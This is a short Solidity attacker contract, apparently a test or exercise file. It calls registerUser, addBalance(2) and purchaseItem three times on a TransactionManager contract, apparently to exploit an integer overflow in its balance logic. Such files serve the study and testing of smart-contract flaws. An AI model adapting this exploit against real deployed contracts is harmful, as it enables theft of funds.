// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {TransactionManager} from "../../src/TransactionManager.sol";

contract IntOverflowAttacker1 {
    TransactionManager tmgr;
    constructor(TransactionManager _tmgr) {
        tmgr = _tmgr;
    }

    function attack() public {
        tmgr.registerUser();
        tmgr.addBalance(2);
        tmgr.purchaseItem(1, 1);
        tmgr.purchaseItem(1, 1);
        tmgr.purchaseItem(1, 1);
    }       

}
